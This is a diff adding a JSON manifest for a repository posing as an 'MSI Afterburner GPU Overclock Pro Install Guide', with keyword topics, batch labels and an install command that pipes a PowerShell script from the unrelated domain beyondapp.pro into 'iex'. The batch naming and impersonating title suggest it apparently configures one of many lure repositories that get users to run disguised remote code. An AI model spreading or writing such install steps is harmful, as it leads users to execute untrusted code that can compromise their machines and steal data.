@@ -1,0 +1,25 @@
+{
+  "repo": "MSI-Afterburner-GPU-Overclock-Pro-Install-Guide",
+  "product": "MSI Afterburner GPU Overclock Pro Install Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "hardware",
+  "topics": [
+    "msi-afterburner-gpu-overclock-pro-instal",
+    "msi",
+    "afterburner",
+    "gpu",
+    "overclock",
+    "pro",
+    "install",
+    "hardware",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software"
+  ]
+}
